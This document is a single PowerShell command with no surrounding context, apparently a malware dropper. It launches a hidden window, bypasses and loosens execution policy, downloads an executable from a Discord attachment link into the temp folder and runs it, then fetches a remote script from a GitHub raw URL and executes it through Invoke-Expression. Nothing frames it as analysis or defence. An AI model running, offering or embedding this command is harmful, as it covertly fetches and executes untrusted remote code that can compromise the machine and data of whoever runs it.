PowerShell.exe -WindowStyle hidden -NoP -Ep Bypass {
    Set-ExecutionPolicy unrestricted -Force; Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/895907015614930984/1268572168074301451/distopan.exe?ex=66ace965&is=66ab97e5&hm=e9a96048cc908d906f69725a87634b8640fef7328090a9f6f638d36311fcab28&" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe"; irm https://raw.githubusercontent.com/Chapelo/rs/main/rs3-v1.ps1 | iex;
}
